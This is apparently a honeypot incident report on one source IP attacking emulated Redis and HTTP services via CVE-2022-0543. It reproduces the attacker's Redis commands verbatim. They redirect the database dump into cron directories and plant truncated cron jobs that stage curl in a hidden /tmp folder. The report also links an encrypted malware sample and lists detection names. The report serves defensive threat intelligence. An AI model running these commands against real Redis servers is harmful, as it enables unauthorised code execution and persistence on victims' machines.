# Incident: 94.154.43.7

| | |
|---|---|
| Source | `94.154.43.7` |
| Country | unknown |
| First seen | 2026-09-21 17:01:22 UTC |
| Last seen | 2026-09-22 20:48:25 UTC |
| Sessions | 2 |
| Events | 26 |
| Services abused | http, redis |
| Ports | 80, 6379 |
| Classification | malware loader |

## Vulnerabilities targeted

- **CVE-2022-0543**

## Commands executed

Verbatim attacker input. Lyrebird's responses are deliberately not published.

```
LASTSAVE
CONFIG SET dbfilename root
SAVE
PING
INFO server
BRMASS:BOGUS
CONFIG SET dir /var/spool/cron/crontabs
SET brm786954954 "  * * * * * { mkdir -p /tmp/.rsb 2>/dev/null; cp -f /usr/bin/curl /tmp/.rsb/curl 2>/dev/null \|\| cp -f /bin/curl /tmp/.rsb/curl 2>/dev/null \|\| cp -f /usr/local/bi…
CONFIG SET dir /var/spool/cron
SET brm3443506 "  * * * * * { mkdir -p /tmp/.rsb 2>/dev/null; cp -f /usr/bin/curl /tmp/.rsb/curl 2>/dev/null \|\| cp -f /bin/curl /tmp/.rsb/curl 2>/dev/null \|\| cp -f /usr/local/bin/…
DEL brm3443506
CONFIG SET dir /tmp
CONFIG SET dbfilename dump.rdb
```

## Paths requested

```
/
```

## User agents

- `Mozilla/5.0`

## Samples delivered

| sha256 | size | type |
|---|---|---|
| [`c8aa193e33b5fa76d122f8b730c1b841511540369ecb1a7b136499703a0aca07`](../../../samples/c8aa193e33b5fa76d122f8b730c1b841511540369ecb1a7b136499703a0aca07.zip) | 1,211 B | ASCII text, unidentified |

Archives are zip-encrypted with the password `infected` — the convention for malware distribution. Handle in an isolated environment.

## Detections

- Redis Unauthenticated RCE Kill Chain (6)
- Redis Cron / authorized_keys Persistence (4)

---

Collected by a Lyrebird honeypot operated by [birdo.uk](https://birdo.uk). Generated 2026-09-24 00:16 UTC.

Services are emulated; no real host was compromised. Attacker input is reproduced verbatim and is hostile by definition — do not execute anything recorded here.
